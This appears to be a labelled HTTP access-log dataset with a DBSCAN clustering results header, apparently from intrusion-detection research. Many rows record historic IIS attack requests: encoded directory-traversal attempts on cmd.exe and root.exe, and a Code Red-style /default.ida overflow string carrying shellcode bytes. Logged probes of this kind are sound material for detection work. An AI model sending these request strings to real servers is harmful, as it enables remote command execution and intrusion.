#------------------------------------------------------------------------------------------------------------
#  ~ DateTime: 2020-05-29 16:54:53
#  ~ Dataframe name: "http_access_log"
#  ~ Number of events in the dataframe: 3554
#  ~ Number of unique labels ('label_event_type') in the dataframe: 12
#  ~ Selected features set for the clustering: ['HTTP_method', 'ClientRequestLine@', 'StatusCode', 'ObjectSize~', 'Referrer~', 'Agent@']
#  ~ The dataframe was scaled using the scaler: MinMaxScaler
#  ~ Parameters:  EPS=0.10286568826994683  MinPts=2 (The EPS parameter was calculated in 0.006379 seconds)
#  ~ The DBSCAN clustering process was performed in 0.193605 seconds
#  ~ Results summary: (20 Clus. | 5 Outl. | Homg.: 99.93% | Comp.: 93.22% | V-measure: 96.46% | AR: 97.24% | AMI: 93.13%)
#
#  ~ Details of clusters:
#       Cluster [0] contains 484 items. MV:["AE0"]. Details:{'AE': 484}
#       Cluster [1] contains 979 items. MV:["AA1"]. Details:{'AA': 979}
#       Cluster [2] contains 109 items. MV:["AB2"]. Details:{'AB': 109}
#       Cluster [3] contains 86 items. MV:["AE3"]. Details:{'AE': 86}
#       Cluster [4] contains 587 items. MV:["AC4"]. Details:{'AC': 587}
#       Cluster [5] contains 23 items. MV:["AD5"]. Details:{'AD': 23}
#       Cluster [6] contains 14 items. MV:["AD6"]. Details:{'AD': 14}
#       Cluster [7] contains 3 items. MV:["AC7"]. Details:{'AC': 3}
#       Cluster [8] contains 46 items. MV:["AI8"]. Details:{'AI': 46}
#       Cluster [9] contains 100 items. MV:["AH9"]. Details:{'AH': 100}
#       Cluster [10] contains 125 items. MV:["AF10"]. Details:{'AF': 125}
#       Cluster [11] contains 16 items. MV:["AD11"]. Details:{'AD': 16}
#       Cluster [12] contains 32 items. MV:["AH12"]. Details:{'AH': 32}
#       Cluster [13] contains 769 items. MV:["AJ13"]. Details:{'AJ': 769}
#       Cluster [14] contains 14 items. MV:["AK14"]. Details:{'AK': 14}
#       Cluster [15] contains 54 items. MV:["AK15"]. Details:{'AE': 1, 'AK': 53}
#       Cluster [16] contains 5 items. MV:["AD16"]. Details:{'AD': 5}
#       Cluster [17] contains 57 items. MV:["AL17"]. Details:{'AL': 57}
#       Cluster [18] contains 23 items. MV:["AG18"]. Details:{'AG': 23}
#       Cluster [19] contains 23 items. MV:["AK19"]. Details:{'AK': 23}
#
#  ~ Details of outliers: {'AC': 1, 'AD': 1, 'AE': 3}
#
#  ~ Confusion matrix:
#     +--------+-----------------------------------------------------------------------------------+
#     | Actual +                                    Predicted                                      |
#     +--------+------+------+------+------+------+------+------+------+------+------+------+------+
#     |        |  AA  |  AB  |  AC  |  AD  |  AE  |  AF  |  AG  |  AH  |  AI  |  AJ  |  AK  |  AL  |
#     +--------+------+------+------+------+------+------+------+------+------+------+------+------+
#     |   AA   | 979  |      |      |      |      |      |      |      |      |      |      |      |
#     |   AB   |      | 109  |      |      |      |      |      |      |      |      |      |      |
#     |   AC   |      |      | 590  |      |      |      |      |      |      |      |      |      |
#     |   AD   |      |      |      |  58  |      |      |      |      |      |      |      |      |
#     |   AE   |      |      |      |      | 570  |      |      |      |      |      |  1   |      |
#     |   AF   |      |      |      |      |      | 125  |      |      |      |      |      |      |
#     |   AG   |      |      |      |      |      |      |  23  |      |      |      |      |      |
#     |   AH   |      |      |      |      |      |      |      | 132  |      |      |      |      |
#     |   AI   |      |      |      |      |      |      |      |      |  46  |      |      |      |
#     |   AJ   |      |      |      |      |      |      |      |      |      | 769  |      |      |
#     |   AK   |      |      |      |      |      |      |      |      |      |      |  90  |      |
#     |   AL   |      |      |      |      |      |      |      |      |      |      |      |  57  |
#     +--------+------+------+------+------+------+------+------+------+------+------+------+------+
#
#  ~ Note: to import this file into Python, use: "DF = pandas.read_csv(file_name, sep=',', comment='#')"
#
#------------------------------------------------------------------------------------------------------------
DateTime~,Http_protocol@,ObjectSize~,Agent@,HTTP_method,ClientRequestLine@,StatusCode,ClientIP$,Referrer~,label_event_type~,label_IPpair_ID~,phase1_predicted_label~
1108344041,"HTTP/1.1",2898,"Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","GET","/","'403'",9068082195189,"-","AE","S529","A_0"
1108354777,"HTTP/1.0",1041,"-","GET","/scripts/root.exe?/c+dir","'404'",9069210209141,"-","AA","S542","A_1"
1108354777,"HTTP/1.0",1041,"-","GET","/MSADC/root.exe?/c+dir","'404'",9069210209141,"-","AA","S542","A_1"
1108354777,"HTTP/1.0",1041,"-","GET","/c/winnt/system32/cmd.exe?/c+dir","'404'",9069210209141,"-","AA","S542","A_1"
1108354778,"HTTP/1.0",1041,"-","GET","/d/winnt/system32/cmd.exe?/c+dir","'404'",9069210209141,"-","AA","S542","A_1"
1108354778,"HTTP/1.0",1041,"-","GET","/scripts/..%255c../winnt/system32/cmd.exe?/c+dir","'404'",9069210209141,"-","AA","S542","A_1"
1108354778,"HTTP/1.0",1041,"-","GET","/_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir","'404'",9069210209141,"-","AA","S542","A_1"
1108354778,"HTTP/1.0",1041,"-","GET","/_mem_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir","'404'",9069210209141,"-","AA","S542","A_1"
1108354778,"HTTP/1.0",1041,"-","GET","/msadc/..%255c../..%255c../..%255c/..%c1%1c../..%c1%1c../..%c1%1c../winnt/system32/cmd.exe?/c+dir","'404'",9069210209141,"-","AA","S542","A_1"
1108354778,"HTTP/1.0",1041,"-","GET","/scripts/..%c1%1c../winnt/system32/cmd.exe?/c+dir","'404'",9069210209141,"-","AA","S542","A_1"
1108354779,"HTTP/1.0",1041,"-","GET","/scripts/..%c0%2f../winnt/system32/cmd.exe?/c+dir","'404'",9069210209141,"-","AA","S542","A_1"
1108354779,"HTTP/1.0",1041,"-","GET","/scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir","'404'",9069210209141,"-","AA","S542","A_1"
1108354779,"HTTP/1.0",1041,"-","GET","/scripts/..%c1%9c../winnt/system32/cmd.exe?/c+dir","'404'",9069210209141,"-","AA","S542","A_1"
1108354779,"HTTP/1.0",974,"-","GET","/scripts/..%%35%63../winnt/system32/cmd.exe?/c+dir","'400'",9069210209141,"-","AB","S542","A_2"
1108354779,"HTTP/1.0",974,"-","GET","/scripts/..%%35c../winnt/system32/cmd.exe?/c+dir","'400'",9069210209141,"-","AB","S542","A_2"
1108354780,"HTTP/1.0",1041,"-","GET","/scripts/..%25%35%63../winnt/system32/cmd.exe?/c+dir","'404'",9069210209141,"-","AA","S542","A_1"
1108354780,"HTTP/1.0",1041,"-","GET","/scripts/..%252f../winnt/system32/cmd.exe?/c+dir","'404'",9069210209141,"-","AA","S542","A_1"
1108357153,"HTTP/1.0",2898,"-","GET","/","'403'",9061166155162,"-","AE","S394","A_3"
1108357153,"HTTP/1.0",2898,"-","GET","/","'403'",9061166155162,"-","AE","S394","A_3"
1108357153,"HTTP/1.0",2898,"-","GET","/","'403'",9061166155162,"-","AE","S394","A_3"
1108357153,"HTTP/1.0",2898,"-","GET","/","'403'",9061166155162,"-","AE","S394","A_3"
1108357153,"HTTP/1.0",2898,"-","GET","/","'403'",9061166155162,"-","AE","S394","A_3"
1108357153,"HTTP/1.0",2898,"-","GET","/","'403'",9061166155162,"-","AE","S394","A_3"
1108357153,"HTTP/1.0",2898,"-","GET","/","'403'",9061166155162,"-","AE","S394","A_3"
1108357153,"HTTP/1.0",2898,"-","GET","/","'403'",9061166155162,"-","AE","S394","A_3"
1108357154,"HTTP/1.0",2898,"-","GET","/","'403'",9061166155162,"-","AE","S394","A_3"
1108357156,"HTTP/1.0",2898,"-","GET","/","'403'",9061166155162,"-","AE","S394","A_3"
1108357156,"HTTP/1.0",2898,"-","GET","/","'403'",9061166155162,"-","AE","S394","A_3"
1108357156,"HTTP/1.0",2898,"-","GET","/","'403'",9061166155162,"-","AE","S394","A_3"
1108357156,"HTTP/1.0",2898,"-","GET","/","'403'",9061166155162,"-","AE","S394","A_3"
1108357156,"HTTP/1.0",2898,"-","GET","/","'403'",9061166155162,"-","AE","S394","A_3"
1108357156,"HTTP/1.0",2898,"-","GET","/","'403'",9061166155162,"-","AE","S394","A_3"
1108357174,"HTTP/1.0",2898,"-","GET","/","'403'",9061166155162,"-","AE","S394","A_3"
1108357198,"HTTP/1.0",2898,"-","GET","/","'403'",9061166155162,"-","AE","S394","A_3"
1108360972,"HTTP/1.1",2898,"Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","GET","/","'403'",9067133116245,"-","AE","S494","A_0"
1108362120,"HTTP/1.0",1061,"-","GET","/default.ida?XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX%u9090%u6858%ucbd3%u7801%u9090%u6858%ucbd3%u7801%u9090%u6858%ucbd3%u7801%u9090%u9090%u8190%u00c3%u0003%u8b00%u531b%u53ff%u0078%u0000%u00=a","'404'",9063226106228,"-","AA","S433","A_1"
1108366284,"HTTP/1.0",1061,"-","GET","/default.ida?XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX%u9090%u6858%ucbd3%u7801%u9090%u6858%ucbd3%u7801%u9090%u6858%ucbd3%u7801%u9090%u9090%u8190%u00c3%u0003%u8b00%u531b%u53ff%u0078%u0000%u00=a","'404'",9063226106228,"-","AA","S433","A_1"
1108366350,"HTTP/1.1",2898,"Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","GET","/","'403'",9151204224089,"-","AE","S22","A_0"
1108372901,"HTTP/1.0",1061,"-","GET","/default.ida?XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX%u9090%u6858%ucbd3%u7801%u9090%u6858%ucbd3%u7801%u9090%u6858%ucbd3%u7801%u9090%u9090%u8190%u00c3%u0003%u8b00%u531b%u53ff%u0078%u0000%u00=a","'404'",9063226106228,"-","AA","S433","A_1"
1108375922,"HTTP/1.0",1041,"-","GET","/scripts/root.exe?/c+dir","'404'",9024005169095,"-","AA","S339","A_1"
1108375923,"HTTP/1.0",1041,"-","GET","/MSADC/root.exe?/c+dir","'404'",9024005169095,"-","AA","S339","A_1"
1108375925,"HTTP/1.0",1041,"-","GET","/c/winnt/system32/cmd.exe?/c+dir","'404'",9024005169095,"-","AA","S339","A_1"
1108375926,"HTTP/1.0",1041,"-","GET","/d/winnt/system32/cmd.exe?/c+dir","'404'",9024005169095,"-","AA","S339","A_1"
1108375928,"HTTP/1.0",1041,"-","GET","/scripts/..%255c../winnt/system32/cmd.exe?/c+dir","'404'",9024005169095,"-","AA","S339","A_1"
1108375929,"HTTP/1.0",1041,"-","GET","/_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir","'404'",9024005169095,"-","AA","S339","A_1"
1108375931,"HTTP/1.0",1041,"-","GET","/_mem_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir","'404'",9024005169095,"-","AA","S339","A_1"
1108375932,"HTTP/1.0",1041,"-","GET","/msadc/..%255c../..%255c../..%255c/..%c1%1c../..%c1%1c../..%c1%1c../winnt/system32/cmd.exe?/c+dir","'404'",9024005169095,"-","AA","S339","A_1"
1108375934,"HTTP/1.0",1041,"-","GET","/scripts/..%c1%1c../winnt/system32/cmd.exe?/c+dir","'404'",9024005169095,"-","AA","S339","A_1"
1108375935,"HTTP/1.0",1041,"-","GET","/scripts/..%c0%2f../winnt/system32/cmd.exe?/c+dir","'404'",9024005169095,"-","AA","S339","A_1"
1108375937,"HTTP/1.0",1041,"-","GET","/scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir","'404'",9024005169095,"-","AA","S339","A_1"
1108375938,"HTTP/1.0",1041,"-","GET","/scripts/..%c1%9c../winnt/system32/cmd.exe?/c+dir","'404'",9024005169095,"-","AA","S339","A_1"
1108375940,"HTTP/1.0",974,"-","GET","/scripts/..%%35%63../winnt/system32/cmd.exe?/c+dir","'400'",9024005169095,"-","AB","S339","A_2"
1108375941,"HTTP/1.0",974,"-","GET","/scripts/..%%35c../winnt/system32/cmd.exe?/c+dir","'400'",9024005169095,"-","AB","S339","A_2"
1108375943,"HTTP/1.0",1041,"-","GET","/scripts/..%25%35%63../winnt/system32/cmd.exe?/c+dir","'404'",9024005169095,"-","AA","S339","A_1"
1108375944,"HTTP/1.0",1041,"-","GET","/scripts/..%252f../winnt/system32/cmd.exe?/c+dir","'404'",9024005169095,"-","AA","S339","A_1"
1108377147,"HTTP/1.1",2898,"Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","GET","/","'403'",9222166160136,"-","AE","S292","A_0"
1108391883,"HTTP/1.1",2898,"Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","GET","/","'403'",9067033135075,"-","AE","S508","A_0"
1108394568,"HTTP/1.0",1041,"-","GET","/scripts/root.exe?/c+dir","'404'",9172155203099,"-","AA","S37","A_1"
1108394568,"HTTP/1.0",1041,"-","GET","/MSADC/root.exe?/c+dir","'404'",9172155203099,"-","AA","S37","A_1"
1108394569,"HTTP/1.0",1041,"-","GET","/c/winnt/system32/cmd.exe?/c+dir","'404'",9172155203099,"-","AA","S37","A_1"
1108394570,"HTTP/1.0",1041,"-","GET","/d/winnt/system32/cmd.exe?/c+dir","'404'",9172155203099,"-","AA","S37","A_1"
1108394570,"HTTP/1.0",1041,"-","GET","/scripts/..%255c../winnt/system32/cmd.exe?/c+dir","'404'",9172155203099,"-","AA","S37","A_1"
1108394571,"HTTP/1.0",1041,"-","GET","/_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir","'404'",9172155203099,"-","AA","S37","A_1"
1108394572,"HTTP/1.0",1041,"-","GET","/_mem_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir","'404'",9172155203099,"-","AA","S37","A_1"
1108394572,"HTTP/1.0",1041,"-","GET","/msadc/..%255c../..%255c../..%255c/..%c1%1c../..%c1%1c../..%c1%1c../winnt/system32/cmd.exe?/c+dir","'404'",9172155203099,"-","AA","S37","A_1"
1108394573,"HTTP/1.0",1041,"-","GET","/scripts/..%c1%1c../winnt/system32/cmd.exe?/c+dir","'404'",9172155203099,"-","AA","S37","A_1"
1108394574,"HTTP/1.0",1041,"-","GET","/scripts/..%c0%2f../winnt/system32/cmd.exe?/c+dir","'404'",9172155203099,"-","AA","S37","A_1"
1108394574,"HTTP/1.0",1041,"-","GET","/scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir","'404'",9172155203099,"-","AA","S37","A_1"
1108394575,"HTTP/1.0",1041,"-","GET","/scripts/..%c1%9c../winnt/system32/cmd.exe?/c+dir","'404'",9172155203099,"-","AA","S37","A_1"
1108394575,"HTTP/1.0",974,"-","GET","/scripts/..%%35%63../winnt/system32/cmd.exe?/c+dir","'400'",9172155203099,"-","AB","S37","A_2"
1108394576,"HTTP/1.0",974,"-","GET","/scripts/..%%35c../winnt/system32/cmd.exe?/c+dir","'400'",9172155203099,"-","AB","S37","A_2"
1108394577,"HTTP/1.0",1041,"-","GET","/scripts/..%25%35%63../winnt/system32/cmd.exe?/c+dir","'404'",9172155203099,"-","AA","S37","A_1"
1108394577,"HTTP/1.0",1041,"-","GET","/scripts/..%252f../winnt/system32/cmd.exe?/c+dir","'404'",9172155203099,"-","AA","S37","A_1"
1108416689,"HTTP/1.0",2898,"-","GET","/","'403'",9061166155162,"-","AE","S394","A_3"
1108416689,"HTTP/1.0",2898,"-","GET","/","'403'",9061166155162,"-","AE","S394","A_3"
1108416690,"HTTP/1.0",2898,"-","GET","/","'403'",9061166155162,"-","AE","S394","A_3"
1108416690,"HTTP/1.0",2898,"-","GET","/","'403'",9061166155162,"-","AE","S394","A_3"
1108416690,"HTTP/1.0",2898,"-","GET","/","'403'",9061166155162,"-","AE","S394","A_3"
1108416690,"HTTP/1.0",2898,"-","GET","/","'403'",9061166155162,"-","AE","S394","A_3"
1108416690,"HTTP/1.0",2898,"-","GET","/","'403'",9061166155162,"-","AE","S394","A_3"
1108416690,"HTTP/1.0",2898,"-","GET","/","'403'",9061166155162,"-","AE","S394","A_3"
1108416690,"HTTP/1.0",2898,"-","GET","/","'403'",9061166155162,"-","AE","S394","A_3"
1108416690,"HTTP/1.0",2898,"-","GET","/","'403'",9061166155162,"-","AE","S394","A_3"
1108416690,"HTTP/1.0",2898,"-","GET","/","'403'",9061166155162,"-","AE","S394","A_3"
1108416690,"HTTP/1.0",2898,"-","GET","/","'403'",9061166155162,"-","AE","S394","A_3"
1108416690,"HTTP/1.0",2898,"-","GET","/","'403'",9061166155162,"-","AE","S394","A_3"
1108416690,"HTTP/1.0",2898,"-","GET","/","'403'",9061166155162,"-","AE","S394","A_3"
1108416690,"HTTP/1.0",2898,"-","GET","/","'403'",9061166155162,"-","AE","S394","A_3"
1108416690,"HTTP/1.0",2898,"-","GET","/","'403'",9061166155162,"-","AE","S394","A_3"
1108416690,"HTTP/1.0",2898,"-","GET","/","'403'",9061166155162,"-","AE","S394","A_3"
1108416690,"HTTP/1.0",2898,"-","GET","/","'403'",9061166155162,"-","AE","S394","A_3"
1108416690,"HTTP/1.0",2898,"-","GET","/","'403'",9061166155162,"-","AE","S394","A_3"
1108416692,"HTTP/1.0",2898,"-","GET","/","'403'",9061166155162,"-","AE","S394","A_3"
1108416693,"HTTP/1.0",2898,"-","GET","/","'403'",9061166155162,"-","AE","S394","A_3"
1108418141,"HTTP/1.1",2898,"Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","GET","/","'403'",9069088097162,"-","AE","S554","A_0"
1108427062,"HTTP/1.1",2898,"Mozilla/4.0 (compatible; MSIE 4.01; Windows 95)","GET","http://www.ebay.com/","'403'",9061158118013,"-","AF","S392","A_10"
1108433695,"HTTP/1.1",2898,"Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","GET","/","'403'",9218088113080,"-","AE","S229","A_0"
1108435501,"HTTP/1.1",2898,"Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","GET","/","'403'",9221233071039,"-","AE","S283","A_0"
1108439358,"HTTP/1.1",2898,"Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","GET","/","'403'",9222166160222,"-","AE","S302","A_0"
1108444973,"HTTP/1.1",2898,"Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","GET","/","'403'",9218027197144,"-","AE","S206","A_0"
1108447243,"HTTP/1.1",2898,"Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","GET","/","'403'",9218180098017,"-","AE","S190","A_0"
1108460887,"HTTP/1.0",1061,"-","GET","/sumthin","'404'",9220095231003,"-","AA","S271","A_1"
1108460888,"HTTP/1.0",1061,"-","GET","/sumthin","'404'",9220095231003,"-","AA","S271","A_1"
1108460888,"HTTP/1.0",1061,"-","GET","/sumthin","'404'",9220095231003,"-","AA","S271","A_1"
1108460887,"HTTP/1.0",1061,"-","GET","/sumthin","'404'",9220095231003,"-","AA","S271","A_1"
1108460887,"HTTP/1.0",1061,"-","GET","/sumthin","'404'",9220095231003,"-","AA","S271","A_1"
1108460887,"HTTP/1.0",1061,"-","GET","/sumthin","'404'",9220095231003,"-","AA","S271","A_1"
1108460886,"HTTP/1.0",1061,"-","GET","/sumthin","'404'",9220095231003,"-","AA","S271","A_1"
1108460889,"HTTP/1.0",1061,"-","GET","/sumthin","'404'",9220095231003,"-","AA","S271","A_1"
1108460889,"HTTP/1.0",1061,"-","GET","/sumthin","'404'",9220095231003,"-","AA","S271","A_1"
1108460889,"HTTP/1.0",1061,"-","GET","/sumthin","'404'",9220095231003,"-","AA","S271","A_1"
1108460886,"HTTP/1.0",1061,"-","GET","/sumthin","'404'",9220095231003,"-","AA","S271","A_1"
1108460887,"HTTP/1.0",1061,"-","GET","/sumthin","'404'",9220095231003,"-","AA","S271","A_1"
1108460887,"HTTP/1.0",1061,"-","GET","/sumthin","'404'",9220095231003,"-","AA","S271","A_1"
1108460887,"HTTP/1.0",1061,"-","GET","/sumthin","'404'",9220095231003,"-","AA","S271","A_1"
1108460887,"HTTP/1.0",1061,"-","GET","/sumthin","'404'",9220095231003,"-","AA","S271","A_1"
1108460886,"HTTP/1.0",1061,"-","GET","/sumthin","'404'",9220095231003,"-","AA","S271","A_1"
1108460886,"HTTP/1.0",1061,"-","GET","/sumthin","'404'",9220095231003,"-","AA","S271","A_1"
1108460889,"HTTP/1.0",1061,"-","GET","/sumthin","'404'",9220095231003,"-","AA","S271","A_1"
1108460889,"HTTP/1.0",1061,"-","GET","/sumthin","'404'",9220095231003,"-","AA","S271","A_1"
1108460889,"HTTP/1.0",1061,"-","GET","/sumthin","'404'",9220095231003,"-","AA","S271","A_1"
1108460889,"HTTP/1.0",1061,"-","GET","/sumthin","'404'",9220095231003,"-","AA","S271","A_1"
1108460889,"HTTP/1.0",1061,"-","GET","/sumthin","'404'",9220095231003,"-","AA","S271","A_1"
1108460889,"HTTP/1.0",1061,"-","GET","/sumthin","'404'",9220095231003,"-","AA","S271","A_1"
1108474448,"HTTP/1.1",2898,"Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","GET","/","'403'",9062173118194,"-","AE","S419","A_0"
1108486123,"HTTP/1.1",2898,"Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","GET","/","'403'",9218024232055,"-","AE","S202","A_0"
1108493680,"-",1061,"-","GET","/NULL.printer","'404'",9067104084066,"-","AA","S491","A_1"
1108501452,"HTTP/1.0",1052,"HTTPClient","GET","http://www.google.com/intl/zh-CN/","'404'",9061158118013,"-","AH","S392","A_12"
1108520444,"HTTP/1.0",1052,"HTTPClient","GET","http://www.google.com/intl/zh-CN/","'404'",9061158118013,"-","AH","S392","A_12"
1108521034,"HTTP/1.1",2898,"Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","GET","/","'403'",9138089019186,"-","AE","S14","A_0"
1108522222,"HTTP/1.1",2898,"Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","GET","/","'403'",9219138063210,"-","AE","S242","A_0"
1108527220,"HTTP/1.0",1061,"-","GET","/sumthin","'404'",9194225176004,"-","AA","S52","A_1"
1108527220,"HTTP/1.0",1061,"-","GET","/sumthin","'404'",9194225176004,"-","AA","S52","A_1"
1108527220,"HTTP/1.0",1061,"-","GET","/sumthin","'404'",9194225176004,"-","AA","S52","A_1"
1108527220,"HTTP/1.0",1061,"-","GET","/sumthin","'404'",9194225176004,"-","AA","S52","A_1"
1108527220,"HTTP/1.0",1061,"-","GET","/sumthin","'404'",9194225176004,"-","AA","S52","A_1"
1108527220,"HTTP/1.0",1061,"-","GET","/sumthin","'404'",9194225176004,"-","AA","S52","A_1"
1108527220,"HTTP/1.0",1061,"-","GET","/sumthin","'404'",9194225176004,"-","AA","S52","A_1"
1108527223,"HTTP/1.0",1061,"-","GET","/sumthin","'404'",9194225176004,"-","AA","S52","A_1"
1108527223,"HTTP/1.0",1061,"-","GET","/sumthin","'404'",9194225176004,"-","AA","S52","A_1"
1108527228,"HTTP/1.0",1061,"-","GET","/sumthin","'404'",9194225176004,"-","AA","S52","A_1"
1108527229,"HTTP/1.0",1061,"-","GET","/sumthin","'404'",9194225176004,"-","AA","S52","A_1"
1108527229,"HTTP/1.0",1061,"-","GET","/sumthin","'404'",9194225176004,"-","AA","S52","A_1"
1108531679,"HTTP/1.1",2898,"Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","GET","/","'403'",9211158046225,"-","AE","S141","A_0"
1108546022,"HTTP/1.1",0,"Microsoft-WebDAV-MiniRedir/5.1.2600","OPTIONS","/","'200'",9004249111162,"-","AI","S350","A_8"
1108546022,"HTTP/1.1",0,"Microsoft-WebDAV-MiniRedir/5.1.2600","OPTIONS","/","'200'",9004249111162,"-","AI","S350","A_8"
1108546023,"HTTP/1.1",0,"Microsoft-WebDAV-MiniRedir/5.1.2600","OPTIONS","/","'200'",9004249111162,"-","AI","S350","A_8"
1108546024,"HTTP/1.1",0,"Microsoft-WebDAV-MiniRedir/5.1.2600","OPTIONS","/","'200'",9004249111162,"-","AI","S350","A_8"
1108546027,"HTTP/1.1",0,"Microsoft-WebDAV-MiniRedir/5.1.2600","OPTIONS","/","'200'",9004249111162,"-","AI","S350","A_8"
1108546027,"HTTP/1.1",0,"Microsoft-WebDAV-MiniRedir/5.1.2600","OPTIONS","/","'200'",9004249111162,"-","AI","S350","A_8"
1108546027,"HTTP/1.1",0,"Microsoft-WebDAV-MiniRedir/5.1.2600","OPTIONS","/","'200'",9004249111162,"-","AI","S350","A_8"
1108546045,"HTTP/1.1",0,"Microsoft-WebDAV-MiniRedir/5.1.2600","OPTIONS","/","'200'",9004249111162,"-","AI","S350","A_8"
1108546052,"HTTP/1.1",0,"Microsoft-WebDAV-MiniRedir/5.1.2600","OPTIONS","/","'200'",9004249111162,"-","AI","S350","A_8"
1108546053,"HTTP/1.1",0,"Microsoft-WebDAV-MiniRedir/5.1.2600","OPTIONS","/","'200'",9004249111162,"-","AI","S350","A_8"
1108546053,"HTTP/1.1",0,"Microsoft-WebDAV-MiniRedir/5.1.2600","OPTIONS","/","'200'",9004249111162,"-","AI","S350","A_8"
1108546054,"HTTP/1.1",0,"Microsoft-WebDAV-MiniRedir/5.1.2600","OPTIONS","/","'200'",9004249111162,"-","AI","S350","A_8"
1108546055,"HTTP/1.1",0,"Microsoft-WebDAV-MiniRedir/5.1.2600","OPTIONS","/","'200'",9004249111162,"-","AI","S350","A_8"
1108546056,"HTTP/1.1",0,"Microsoft-WebDAV-MiniRedir/5.1.2600","OPTIONS","/","'200'",9004249111162,"-","AI","S350","A_8"
1108546064,"HTTP/1.1",0,"Microsoft-WebDAV-MiniRedir/5.1.2600","OPTIONS","/","'200'",9004249111162,"-","AI","S350","A_8"
1108546064,"HTTP/1.1",0,"Microsoft-WebDAV-MiniRedir/5.1.2600","OPTIONS","/","'200'",9004249111162,"-","AI","S350","A_8"
1108546080,"HTTP/1.1",0,"Microsoft-WebDAV-MiniRedir/5.1.2600","OPTIONS","/","'200'",9004249111162,"-","AI","S350","A_8"
1108546087,"HTTP/1.1",0,"Microsoft-WebDAV-MiniRedir/5.1.2600","OPTIONS","/","'200'",9004249111162,"-","AI","S350","A_8"
1108546088,"HTTP/1.1",0,"Microsoft-WebDAV-MiniRedir/5.1.2600","OPTIONS","/","'200'",9004249111162,"-","AI","S350","A_8"
1108546093,"HTTP/1.1",0,"Microsoft-WebDAV-MiniRedir/5.1.2600","OPTIONS","/","'200'",9004249111162,"-","AI","S350","A_8"
1108546101,"HTTP/1.1",0,"Microsoft-WebDAV-MiniRedir/5.1.2600","OPTIONS","/","'200'",9004249111162,"-","AI","S350","A_8"
